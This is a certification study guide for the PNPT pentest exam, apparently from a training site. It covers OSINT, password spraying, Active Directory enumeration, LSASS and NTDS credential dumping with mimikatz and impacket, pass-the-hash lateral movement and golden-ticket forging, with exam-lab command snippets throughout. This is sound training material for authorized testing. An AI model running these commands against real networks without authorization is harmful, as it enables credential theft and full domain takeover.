---
layout: training-page
title: "PNPT Preparation Path — Red Team Academy"
module: "Learning Paths"
tags:
  - pnpt
  - tcm-security
  - learning-path
  - on-ramp
  - network-pentest
page_key: "learning-paths-pnpt-prep"
render_with_liquid: false
---

# PNPT Preparation Path — 4 to 5 Weeks

The Practical Network Penetration Tester (PNPT) from TCM Security is the best on-ramp to OSCP. It is a fully practical, vendor-neutral certification that walks you through a complete external-to-internal engagement against an Active Directory environment, ending with a professional report. PNPT does not have a buffer overflow component, does not restrict Metasploit, and is materially cheaper than OffSec — which is why it has become the standard "first real cert" for people moving from CTFs into pentesting work.

This path assumes you are comfortable on Linux but have either no pentesting experience, or only HTB-style standalone-machine experience. By the end you will be exam-ready for PNPT and 60–70% of the way to OSCP.

---

## PNPT Exam Overview

| Parameter | Detail |
|---|---|
| Duration | 5 days active testing + 2 days report writing |
| Environment | Single Active Directory domain, external-to-internal engagement |
| Goal | Compromise the domain controller (full domain admin) |
| Scoring | Pass/fail based on report quality and proof of domain compromise |
| Pass threshold | Successful domain compromise + acceptable professional report |
| Allowed tools | Any (Metasploit allowed without restriction) |
| Retake | Free second attempt included |
| Cost | Significantly cheaper than OSCP; voucher includes the full PEH/OSINT/EPP/EWP/EAD courses |

The exam tests an end-to-end engagement narrative:

1. **External reconnaissance** — passive OSINT, exposed assets, employee enumeration
2. **Initial access** — gaining a foothold on an external-facing host or via credentials harvested from OSINT
3. **Internal AD compromise** — moving from foothold to domain admin
4. **Reporting** — a professional client-facing report plus a debrief presentation

PNPT mirrors a real internal pentest more accurately than OSCP. Most candidates report that the AD section is the most realistic AD lab in any practical cert below the CRTO tier.

---

## Prerequisites Checklist

Before starting week 1, confirm you can:
- [ ] Navigate Linux at the shell — pipes, redirection, find, grep
- [ ] Understand TCP vs UDP, the OSI stack, basic DNS, HTTP request/response
- [ ] Stand up a Kali VM and install tools from GitHub repositories
- [ ] Read Python well enough to modify a 50-line exploit script
- [ ] Recognise standard nmap output and explain what `-sC -sV` does

If any of the above is uncertain, spend a week on OverTheWire Bandit (levels 0–25) and watch the TCM "Practical Ethical Hacking" first chapters before starting week 1.

---

## Week 1: External Recon and OSINT

**Goal:** Build a complete external attack-surface profile of a target organization using only public sources.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/fundamentals/methodology](/fundamentals/methodology) | Engagement phases, the PTES framework, structured thinking |
| [/fundamentals/engagement-planning](/fundamentals/engagement-planning) | Scope, rules of engagement, client communication |
| [/recon/passive-recon](/recon/passive-recon) | OSINT, subdomain enumeration, exposed asset discovery |
| [/recon/osint-people](/recon/osint-people) | Employee enumeration, email harvesting, LinkedIn pivots |

### OSINT Workflow for PNPT

PNPT's external phase rewards methodical OSINT. The exam includes target users, exposed credentials, and external services that only become visible once you map the org properly.

```bash
# Subdomain enumeration
subfinder -d <target.tld> -all -o subs.txt
amass enum -passive -d <target.tld> -o amass.txt
cat subs.txt amass.txt | sort -u > all_subs.txt

# Live host probing
cat all_subs.txt | httpx -title -tech-detect -status-code -o live.txt

# Screenshot every live host
cat live.txt | aquatone -out aquatone_report
```

### Employee Enumeration

```bash
# Email format discovery
hunter.io  # paid but worth a free trial for the exam window
theHarvester -d <target.tld> -b all -l 500

# LinkedIn employee scraping
# Use linkedin2username with cookies from a burner account
python3 linkedin2username.py -c <company-slug> -o emails.txt -f '{first}.{last}@<target.tld>'
```

### Key Concepts

- **Email format** — drives password spraying targets later in the engagement
- **Breached credential reuse** — check exposed creds via HaveIBeenPwned, Dehashed, breach-parse
- **External login portals** — OWA, Citrix, VPN gateways, Microsoft 365, GitLab/Bitbucket on perimeter

### Practice

Pick a public bug-bounty program (Tesla, Yahoo, Atlassian) and build a complete external recon profile in 4 hours. Do not exploit anything — the goal is to internalize the recon workflow, not to test.

---

## Week 2: Initial Access

**Goal:** Convert an externally-visible service or credential into a working foothold on an internal host.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/exploitation/service-exploits](/exploitation/service-exploits) | Public exploit usage, exploit adaptation, version-driven exploit search |
| [/exploitation/password-attacks](/exploitation/password-attacks) | Password spraying, credential stuffing, Hydra workflow |
| [/web/auth-bypass](/web/auth-bypass) | Default creds, session fixation, broken auth |
| [/exploitation/reverse-shells](/exploitation/reverse-shells) | Catching, stabilising, and migrating reverse shells |

### Password Spraying for PNPT

The most common PNPT initial access path is a password spray against an external M365 or OWA portal with a common password against the user list you built last week.

```bash
# MSOLSpray for Microsoft 365
python3 MSOLSpray.py --userlist users.txt --password 'Winter2024!'

# CredKing for low-and-slow sprays via Lambda
# Or simple kerbrute against an exposed Kerberos port
kerbrute passwordspray -d <domain.local> --dc <dc_ip> users.txt 'Welcome1!'
```

**Critical rule:** one password per spray, then wait. Three rapid attempts will lock accounts. The PNPT environment uses realistic lockout policies.

### External Foothold via Web

If the external surface includes a vulnerable web app:

```bash
# Wordpress
wpscan --url https://<target>/ --enumerate u,p,t,vp --api-token <token>

# Standard fingerprint chain
whatweb -a 3 https://<target>/
nikto -h https://<target>/
ffuf -u https://<target>/FUZZ -w /opt/wordlists/raft-medium-directories.txt
```

### Initial Access Priority Order

1. Exposed credentials from OSINT (HIBP, breach data, GitHub leaks)
2. Default credentials on known portals
3. Password spray (one common password across user list)
4. Known CVE against fingerprinted version
5. Web application exploitation
6. Phishing-adjacent paths (only if explicitly in scope — PNPT does not include phishing payloads)

### Practice Machines

- HTB Forest (AS-REP roasting initial access)
- HTB Sauna (AS-REP, kerbrute usage)
- HTB Active (Kerberoasting initial access)
- TryHackMe "Vulnnet: Roasted" (Kerberos initial access lab)

---

## Week 3: Active Directory Internal — Enumeration and Lateral Movement

**Goal:** Once you have a foothold, map the entire domain, find the path to Domain Admin, and execute the lateral moves.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/ad-enumeration](/active-directory/ad-enumeration) | BloodHound, SharpHound, PowerView, ldapdomaindump |
| [/active-directory/kerberoasting](/active-directory/kerberoasting) | SPN discovery, ticket cracking, account selection |
| [/active-directory/as-rep-roasting](/active-directory/as-rep-roasting) | DONT_REQ_PREAUTH abuse, hash format, cracking |
| [/active-directory/pass-the-hash](/active-directory/pass-the-hash) | PtH with CrackMapExec, Impacket suite, WMIexec |
| [/active-directory/lateral-movement](/active-directory/lateral-movement) | WinRM, RDP, PSExec, WMI, SMBexec |

### BloodHound on Day 1 of the Foothold

The moment you land internal credentials, run SharpHound and load the data:

```bash
# From Linux with creds
bloodhound-python -u <user> -p <pass> -d <domain.local> -dc <dc_fqdn> -c All --zip

# Or from Windows
.\SharpHound.exe -c All --zipfilename loot.zip

# Load into BloodHound
neo4j console &
bloodhound &
# Mark owned principals → run "Shortest Paths to Domain Admins from Owned"
```

### Common PNPT-Style AD Attack Chains

| Initial Privilege | Path to DA |
|---|---|
| Any domain user | Kerberoast service account → crack ticket → use creds |
| AS-REP-roastable user | Hash crack → user creds → enumerate → privilege chain |
| Local admin on workstation | Dump LSASS → harvest cached creds → pivot |
| GenericWrite on a user | Reset password → log in as that user → enumerate |
| GenericAll on a group | Add yourself → inherit group ACLs |
| Account in Backup Operators | Dump NTDS via shadow copy |

### Credential Harvesting Once You Have Local Admin

```powershell
# LSASS dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Move dmp to attacker box
pypykatz lsa minidump lsass.dmp

# Or live with Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# DPAPI master keys for stored creds
dpapi::masterkey /in:"C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<guid>"
```

### Lateral Movement Quick Reference

```bash
# CrackMapExec — broadest spray + check
crackmapexec smb 10.10.10.0/24 -u <user> -H <hash> --shares

# Impacket — single-host shells
impacket-psexec <domain>/<user>@<host> -hashes :<nt_hash>
impacket-wmiexec <domain>/<user>@<host> -hashes :<nt_hash>
impacket-smbexec <domain>/<user>@<host> -hashes :<nt_hash>

# Evil-WinRM — when WinRM is exposed (port 5985/5986)
evil-winrm -i <host> -u <user> -H <nt_hash>
```

### Practice Machines

- HTB Forest (AS-REP → DCSync end-to-end)
- HTB Sauna (AS-REP → AutoLogon password → DCSync)
- HTB Cascade (LDAP recon → credential decrypt → backup operators)
- HTB Mantis (full AD chain, kerberoasting + MSSQL)

---

## Week 4: Domain Compromise and Persistence

**Goal:** Take Domain Admin, dump NTDS.dit, and document evidence of full domain compromise.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/active-directory/dcsync](/active-directory/dcsync) | Replicating Directory Changes, secretsdump, NTDS.dit dump |
| [/active-directory/golden-tickets](/active-directory/golden-tickets) | krbtgt hash abuse, persistence after compromise |
| [/post-exploitation/credential-dumping](/post-exploitation/credential-dumping) | Full credential dump tree — LSASS, NTDS, DPAPI, SAM |
| [/reporting/findings](/reporting/findings) | Finding writeup, evidence, severity, remediation |

### NTDS.dit Dump Workflow

Once you have DA or DCSync rights:

```bash
# From Linux with DA creds
impacket-secretsdump <domain>/<user>:<pass>@<dc_ip>

# Or with DCSync rights only (no DA needed)
impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<pass>@<dc_ip>

# Output includes:
# - Local SAM hashes
# - LSA secrets
# - Cached domain credentials
# - NTDS.dit (every domain user hash)
```

### Capturing Exam Evidence

PNPT requires evidence that proves you compromised the domain. For each milestone in the kill chain, capture:

1. The command you ran (visible in the terminal)
2. The output that proves success
3. Your attacker IP visible somewhere in the screenshot
4. A timestamp

```bash
# Build a screenshot folder structure as you go
mkdir -p ~/pnpt-exam/{recon,initial-access,ad-enum,lateral,domain-admin,evidence}

# Tag every screenshot with kill-chain phase + finding number
# e.g. recon/01-subfinder-output.png
```

### Golden Ticket (Demonstration, Not Required for Pass)

The PNPT exam does not require you to forge a golden ticket — domain compromise is the bar. But practice the technique because it demonstrates the value of the krbtgt hash to clients in your report.

```bash
# Get krbtgt hash from NTDS dump
# Forge ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator

# Use it
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<dc_fqdn>
```

### Practice Machines

- HTB Forest (full chain including DCSync)
- HTB Sauna (DCSync from autologon-recovered service account)
- HTB Resolute (lateral movement + DnsAdmins to DA)
- HTB Reel2 (constrained delegation path to DA — more advanced, optional)

---

## Week 5: Report Writing and Mock Exam

**Goal:** Produce a professional client-facing report and a debrief presentation. Run a full mock exam.

### Required RTA Pages

| Page | Focus |
|---|---|
| [/reporting/findings](/reporting/findings) | Finding writeup format, severity, remediation |
| [/reporting/report-templates](/reporting/report-templates) | Full report templates, executive summary, attack narrative |

### PNPT Report Structure

TCM Security publishes a sample report — read it before you write yours. Your report must include:

1. **Executive Summary** — one page, non-technical, leadership-readable
2. **Attack Narrative** — the chronological story of how you went from external to DA
3. **Findings** — discrete vulnerabilities with severity, evidence, remediation
4. **Recommendations** — prioritized remediation roadmap
5. **Appendices** — full enumeration output, tool versions, scope

### Finding Severity Rubric

| Severity | Criteria |
|---|---|
| Critical | Direct path to domain compromise, e.g., unauthenticated RCE, exposed AD service |
| High | Significant impact requiring some prerequisite, e.g., kerberoastable account with weak password |
| Medium | Notable risk but not direct compromise, e.g., information disclosure, weak password policy |
| Low | Best-practice deviation with limited direct exploit, e.g., outdated TLS, missing security headers |
| Informational | No direct risk, but worth noting for hardening |

### Debrief Presentation

After report submission, PNPT requires a live debrief call where you present your findings as if to the client. Practice the following structure on a 15-minute timer:

1. Scope and objectives (1 min)
2. Highest-impact finding (3 min)
3. Attack chain walkthrough (5 min)
4. Recommendations summary (3 min)
5. Q&A (3 min)

### Mock Exam Protocol

Pick a TCM Security practice lab, a HTB Pro Lab (RastaLabs or Offshore are overkill but useful), or build your own AD lab from week 3 content.

Run a full 5-day engagement against it:
- Day 1 — Recon and OSINT only, no exploitation
- Day 2 — Initial access
- Day 3 — AD enumeration, lateral movement
- Day 4 — Domain compromise, evidence collection
- Day 5 — Catch up, verify everything works reproducibly
- Day 6–7 — Write the report

If you cannot complete the kill chain plus a clean report in 5+2 days, do another week of practice before booking the real exam.

---

## Comparison to OSCP

| Dimension | PNPT | OSCP |
|---|---|---|
| Format | Single contiguous engagement | 5 independent machines |
| AD content | Full external-to-DA chain | Smaller AD set (3 machines) |
| Buffer overflow | None | Required (BOF machine) |
| OSINT | Heavy weighting | Minimal |
| Report | Client-facing professional report | Technical report |
| Metasploit | No restrictions | Limited (one machine only) |
| Time pressure | Lower (5 days) | Higher (24 hours active) |
| Cost | Lower | Higher |
| Industry recognition | Growing rapidly | Established standard |

PNPT is the better first cert. OSCP is the better second cert if you are heading into a consulting role.

---

## Additional Resources

| Resource | Type | Cost |
|---|---|---|
| TCM Security PEH course | Video course bundled with PNPT voucher | Paid |
| TCM Security OSINT Fundamentals | Bundled OSINT course | Paid |
| TCM Security EPP/EWP/EAD courses | External Pentest Playbook, Web, AD | Paid |
| HackTheBox AD machines | Live practice lab | Paid subscription |
| Ippsec YouTube | HTB walkthroughs | Free |
| The Hacker Recipes | AD attack reference | Free |
| Active Directory Security (Sean Metcalf) | Reference blog | Free |
